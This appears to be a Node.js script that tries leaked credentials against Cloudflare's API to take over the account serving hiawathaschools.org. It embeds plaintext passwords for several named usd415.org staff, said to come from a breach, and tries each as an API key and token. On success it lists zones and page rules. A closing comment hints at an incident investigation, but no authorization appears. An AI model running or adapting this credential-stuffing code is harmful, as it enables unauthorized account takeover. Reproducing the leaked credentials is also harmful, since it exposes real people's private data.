/**
 * Test Cloudflare Account Takeover with hiawathaschools.org staff credentials
 * Tries each credential as CF Global API Key and API Token
 */

const CF_API = "https://api.cloudflare.com/client/v4";
const TARGET_DOMAIN = "hiawathaschools.org";

// Staff credentials from LeakCheck (usd415.org breach)
const credentials = [
  { email: "sdavies@usd415.org", passwords: ["m9ucrlac"] },
  { email: "jbrintnall@usd415.org", passwords: ["hmsschool"] },
  { email: "jdunn@usd415.org", passwords: ["adopt", "Rvw"] },
  { email: "mkern@usd415.org", passwords: ["knix475", "6eknix475"] },
  { email: "thampl@usd415.org", passwords: ["rjtkmjd", "2arjtkmjd"] },
  { email: "hsourk@usd415.org", passwords: ["carter29", "brand", "crept", "hsourk", "equation"] },
  { email: "nfisher@usd415.org", passwords: ["nfisher"] },
];

async function tryCfApiKey(email, apiKey) {
  try {
    const resp = await fetch(`${CF_API}/user`, {
      headers: {
        "X-Auth-Email": email,
        "X-Auth-Key": apiKey,
        "Content-Type": "application/json",
      },
      signal: AbortSignal.timeout(10000),
    });
    const data = await resp.json();
    if (data.success && data.result?.id) {
      return { success: true, method: "API Key", detail: `User: ${data.result.email} (${data.result.id})` };
    }
    return { success: false, method: "API Key", detail: `${data.errors?.[0]?.message || "failed"}` };
  } catch (err) {
    return { success: false, method: "API Key", detail: err.message };
  }
}

async function tryCfApiToken(token) {
  try {
    const resp = await fetch(`${CF_API}/user/tokens/verify`, {
      headers: {
        "Authorization": `Bearer ${token}`,
        "Content-Type": "application/json",
      },
      signal: AbortSignal.timeout(10000),
    });
    const data = await resp.json();
    if (data.success && data.result?.status === "active") {
      return { success: true, method: "API Token", detail: `Token active: ${data.result.id}` };
    }
    return { success: false, method: "API Token", detail: `${data.errors?.[0]?.message || "failed"}` };
  } catch (err) {
    return { success: false, method: "API Token", detail: err.message };
  }
}

async function listZones(email, apiKey) {
  try {
    const resp = await fetch(`${CF_API}/zones?name=${TARGET_DOMAIN}`, {
      headers: {
        "X-Auth-Email": email,
        "X-Auth-Key": apiKey,
        "Content-Type": "application/json",
      },
      signal: AbortSignal.timeout(10000),
    });
    const data = await resp.json();
    if (data.success && data.result?.length > 0) {
      return { found: true, zone: data.result[0] };
    }
    // List all zones
    const allResp = await fetch(`${CF_API}/zones?per_page=50`, {
      headers: {
        "X-Auth-Email": email,
        "X-Auth-Key": apiKey,
        "Content-Type": "application/json",
      },
      signal: AbortSignal.timeout(10000),
    });
    const allData = await allResp.json();
    if (allData.success) {
      return { found: false, allZones: allData.result?.map(z => z.name) || [] };
    }
    return { found: false, error: allData.errors };
  } catch (err) {
    return { found: false, error: err.message };
  }
}

async function listPageRules(email, apiKey, zoneId) {
  try {
    const resp = await fetch(`${CF_API}/zones/${zoneId}/pagerules?status=active`, {
      headers: {
        "X-Auth-Email": email,
        "X-Auth-Key": apiKey,
        "Content-Type": "application/json",
      },
      signal: AbortSignal.timeout(10000),
    });
    const data = await resp.json();
    return data.success ? data.result : [];
  } catch {
    return [];
  }
}

async function main() {
  console.log(`\n🔍 Testing CF Account Takeover for ${TARGET_DOMAIN}\n`);
  console.log("=" .repeat(60));
  
  let loginSuccess = null;
  
  for (const cred of credentials) {
    for (const pwd of cred.passwords) {
      console.log(`\n📧 ${cred.email} | 🔑 ${pwd}`);
      
      // Try as API Key
      const keyResult = await tryCfApiKey(cred.email, pwd);
      console.log(`  API Key: ${keyResult.success ? "✅" : "❌"} ${keyResult.detail}`);
      
      if (keyResult.success) {
        loginSuccess = { email: cred.email, apiKey: pwd };
        console.log(`\n🎯🎯🎯 LOGIN SUCCESS! ${cred.email} with API Key`);
        break;
      }
      
      // Try as API Token
      const tokenResult = await tryCfApiToken(pwd);
      console.log(`  API Token: ${tokenResult.success ? "✅" : "❌"} ${tokenResult.detail}`);
      
      if (tokenResult.success) {
        loginSuccess = { email: cred.email, apiKey: pwd, isToken: true };
        console.log(`\n🎯🎯🎯 LOGIN SUCCESS! ${cred.email} with API Token`);
        break;
      }
    }
    if (loginSuccess) break;
  }
  
  if (!loginSuccess) {
    console.log("\n❌ No CF login succeeded with staff credentials");
    console.log("\nNote: These are regular passwords, not CF API keys.");
    console.log("The attacker likely used their own CF account, not the school's.");
    return;
  }
  
  // If login succeeded, find zones and page rules
  console.log("\n📍 Searching for zones...");
  const zones = await listZones(loginSuccess.email, loginSuccess.apiKey);
  console.log("Zones:", JSON.stringify(zones, null, 2));
  
  if (zones.found && zones.zone) {
    console.log(`\n📋 Listing Page Rules for ${zones.zone.name} (${zones.zone.id})...`);
    const rules = await listPageRules(loginSuccess.email, loginSuccess.apiKey, zones.zone.id);
    console.log("Page Rules:", JSON.stringify(rules, null, 2));
  }
}

main().catch(console.error);
